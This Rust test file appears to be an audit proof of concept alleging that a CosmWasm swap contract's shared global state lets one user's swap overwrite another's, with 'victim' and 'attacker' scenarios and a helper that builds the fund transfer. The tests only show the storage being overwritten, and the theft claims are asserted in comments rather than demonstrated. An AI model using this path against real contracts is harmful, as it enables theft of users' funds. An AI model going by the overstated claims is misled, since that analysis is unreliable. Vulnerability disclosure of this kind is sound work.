// Proof of Concept: Global State Overwrite Vulnerability
// This demonstrates how an attacker can steal funds by exploiting the global state

use cosmwasm_std::{
    testing::{mock_dependencies, mock_env, mock_info},
    Addr, BankMsg, Coin, DepsMut, Response, SubMsg, SubMsgResult, Reply,
    coins, to_binary,
};
use injective_cosmwasm::{InjectiveMsgWrapper, InjectiveQueryWrapper};

// Import from the vulnerable contract
use swap::contract::{execute, reply, ATOMIC_ORDER_REPLY_ID};
use swap::msg::ExecuteMsg;
use swap::state::{SWAP_OPERATION_STATE, STEP_STATE, SWAP_RESULTS};
use swap::types::{CurrentSwapOperation, SwapQuantityMode};
use injective_math::FPDecimal;

/// Demonstrates Exploit Path 1: SubMsg Failure State Persistence
#[test]
fn exploit_failed_submsg_state_persistence() {
    let mut deps = mock_dependencies();
    let env = mock_env();
    
    // Step 1: Victim initiates large swap (10,000 USDT → INJ)
    let victim_info = mock_info("victim", &coins(10000_000000, "usdt")); // 10,000 USDT
    let victim_msg = ExecuteMsg::SwapMinOutput {
        target_denom: "inj".to_string(),
        min_output_quantity: FPDecimal::from(100u128),
    };
    
    // Execute victim's swap - this will save state
    let res = execute(deps.as_mut(), env.clone(), victim_info, victim_msg);
    assert!(res.is_ok());
    
    // Verify victim's state is saved in global storage
    let saved_state = SWAP_OPERATION_STATE.load(&deps.storage).unwrap();
    assert_eq!(saved_state.sender_address, Addr::unchecked("victim"));
    assert_eq!(saved_state.input_funds.amount.u128(), 10000_000000);
    
    // Step 2: Simulate SubMsg failure (reply handler NOT called with reply_on_success)
    // In real scenario, this happens when market order fails
    // State remains in storage because cleanup only happens in reply handler
    
    // Step 3: Attacker initiates small swap (1 USDT → ATOM)
    let attacker_info = mock_info("attacker", &coins(1_000000, "usdt")); // 1 USDT
    let attacker_msg = ExecuteMsg::SwapMinOutput {
        target_denom: "atom".to_string(),
        min_output_quantity: FPDecimal::from(1u128),
    };
    
    // Execute attacker's swap - this overwrites victim's state
    let res = execute(deps.as_mut(), env.clone(), attacker_info, attacker_msg);
    assert!(res.is_ok());
    
    // Step 4: Simulate successful SubMsg for attacker
    let success_reply = Reply {
        id: ATOMIC_ORDER_REPLY_ID,
        result: SubMsgResult::Ok(Default::default()),
    };
    
    // When reply handler executes, it loads whatever is in global state
    // Due to the vulnerability, this could be victim's state or mixed state
    let reply_res = reply(deps.as_mut(), env.clone(), success_reply);
    
    // In the vulnerable implementation, funds could be sent to wrong address
    // or state corruption could cause fund loss
}

/// Demonstrates Exploit Path 2: Direct State Overwrite Race Condition
#[test]
fn exploit_direct_state_overwrite() {
    let mut deps = mock_dependencies();
    let env = mock_env();
    
    // Scenario: Two users submit swaps in same block
    // Due to global state, second user overwrites first user's state
    
    // User A starts swap with 5000 ATOM
    let user_a_info = mock_info("user_a", &coins(5000_000000, "atom"));
    let user_a_msg = ExecuteMsg::SwapMinOutput {
        target_denom: "osmo".to_string(),
        min_output_quantity: FPDecimal::from(100u128),
    };
    
    let res_a = execute(deps.as_mut(), env.clone(), user_a_info, user_a_msg);
    assert!(res_a.is_ok());
    
    // Check User A's state is saved
    let state_after_a = SWAP_OPERATION_STATE.load(&deps.storage).unwrap();
    assert_eq!(state_after_a.sender_address, Addr::unchecked("user_a"));
    
    // User B starts swap IMMEDIATELY after (same block)
    let user_b_info = mock_info("user_b", &coins(100_000000, "inj"));
    let user_b_msg = ExecuteMsg::SwapMinOutput {
        target_denom: "eth".to_string(),
        min_output_quantity: FPDecimal::from(1u128),
    };
    
    let res_b = execute(deps.as_mut(), env.clone(), user_b_info, user_b_msg);
    assert!(res_b.is_ok());
    
    // CRITICAL BUG: User B has overwritten User A's state!
    let state_after_b = SWAP_OPERATION_STATE.load(&deps.storage).unwrap();
    assert_eq!(state_after_b.sender_address, Addr::unchecked("user_b")); // User A's state is gone!
    assert_eq!(state_after_b.input_funds.denom, "inj"); // Completely overwritten
    
    // When User A's reply handler executes, it will load User B's state
    // This causes fund misdirection or loss
}

/// Demonstrates Exploit Path 3: Multi-Step Swap State Corruption
#[test]
fn exploit_multi_step_swap_interruption() {
    let mut deps = mock_dependencies();
    let env = mock_env();
    
    // User A starts multi-step swap: ETH → USDT → INJ
    let user_a_info = mock_info("user_a", &coins(10_000000000000000000, "eth")); // 10 ETH
    let user_a_msg = ExecuteMsg::SwapMinOutput {
        target_denom: "inj".to_string(),
        min_output_quantity: FPDecimal::from(1000u128),
    };
    
    let res = execute(deps.as_mut(), env.clone(), user_a_info, user_a_msg);
    assert!(res.is_ok());
    
    // Simulate first step completion (ETH → USDT)
    // This would normally update STEP_STATE with intermediate results
    
    // User B starts their own swap, overwriting global state
    let user_b_info = mock_info("user_b", &coins(50_000000, "atom"));
    let user_b_msg = ExecuteMsg::SwapMinOutput {
        target_denom: "osmo".to_string(),
        min_output_quantity: FPDecimal::from(10u128),
    };
    
    let res_b = execute(deps.as_mut(), env.clone(), user_b_info, user_b_msg);
    assert!(res_b.is_ok());
    
    // When User A's second step tries to execute, it loads corrupted state
    // User A's funds are now at risk of being sent to User B or lost entirely
}

/// Demonstrates the attack with actual fund theft
#[test]
fn exploit_actual_fund_theft() {
    let mut deps = mock_dependencies();
    let env = mock_env();
    
    // Victim deposits large amount
    let victim_info = mock_info("victim_wallet", &coins(1000000_000000, "usdt")); // 1M USDT
    let victim_msg = ExecuteMsg::SwapMinOutput {
        target_denom: "btc".to_string(),
        min_output_quantity: FPDecimal::from(10u128),
    };
    
    // Victim's transaction saves state
    execute(deps.as_mut(), env.clone(), victim_info, victim_msg).unwrap();
    
    // Attacker monitors and quickly submits their transaction
    let attacker_info = mock_info("attacker_wallet", &coins(1_000000, "usdt"));
    let attacker_msg = ExecuteMsg::SwapMinOutput {
        target_denom: "eth".to_string(),
        min_output_quantity: FPDecimal::from(1u128),
    };
    
    // Attacker's transaction overwrites state
    execute(deps.as_mut(), env.clone(), attacker_info, attacker_msg).unwrap();
    
    // Load the corrupted state
    let corrupted_state = SWAP_OPERATION_STATE.load(&deps.storage).unwrap();
    
    // The state now has attacker's address but could have victim's funds
    // or mixed state that leads to fund misdirection
    assert_eq!(corrupted_state.sender_address, Addr::unchecked("attacker_wallet"));
    
    // In production, when reply handlers execute:
    // - Victim's reply might process attacker's state
    // - Attacker's reply might process victim's funds
    // - Either way, funds are stolen or lost
}

/// Demonstrates that there's NO protection against concurrent swaps
#[test]
fn no_concurrent_swap_protection() {
    let mut deps = mock_dependencies();
    let env = mock_env();
    
    // User starts first swap
    let user_info = mock_info("user", &coins(1000_000000, "atom"));
    let msg1 = ExecuteMsg::SwapMinOutput {
        target_denom: "osmo".to_string(),
        min_output_quantity: FPDecimal::from(100u128),
    };
    
    let res1 = execute(deps.as_mut(), env.clone(), user_info.clone(), msg1);
    assert!(res1.is_ok()); // First swap succeeds
    
    // Same user starts second swap immediately (should fail but doesn't!)
    let msg2 = ExecuteMsg::SwapMinOutput {
        target_denom: "inj".to_string(),
        min_output_quantity: FPDecimal::from(50u128),
    };
    
    let res2 = execute(deps.as_mut(), env.clone(), user_info, msg2);
    assert!(res2.is_ok()); // BUG: Second swap also succeeds, overwriting first!
    
    // This proves there's no protection against concurrent swaps
    // User's first swap state is completely lost
}

/// Helper function to demonstrate fund redirection in reply handler
fn demonstrate_fund_redirection_in_reply(deps: DepsMut<InjectiveQueryWrapper>) {
    // In the vulnerable reply handler (swap.rs:229-230):
    // let send_message = BankMsg::Send {
    //     to_address: swap.sender_address.to_string(),
    //     amount: vec![new_balance.clone().into()],
    // };
    
    // The swap.sender_address comes from global state
    // If attacker overwrites state, funds go to attacker's address
    
    let corrupted_state = SWAP_OPERATION_STATE.load(deps.storage).unwrap();
    
    // Funds will be sent to whoever is in sender_address
    let theft_message = BankMsg::Send {
        to_address: corrupted_state.sender_address.to_string(), // Could be attacker!
        amount: vec![Coin::new(1000000_000000u128, "usdt")], // Victim's funds
    };
    
    // This message would be added to response, stealing funds
}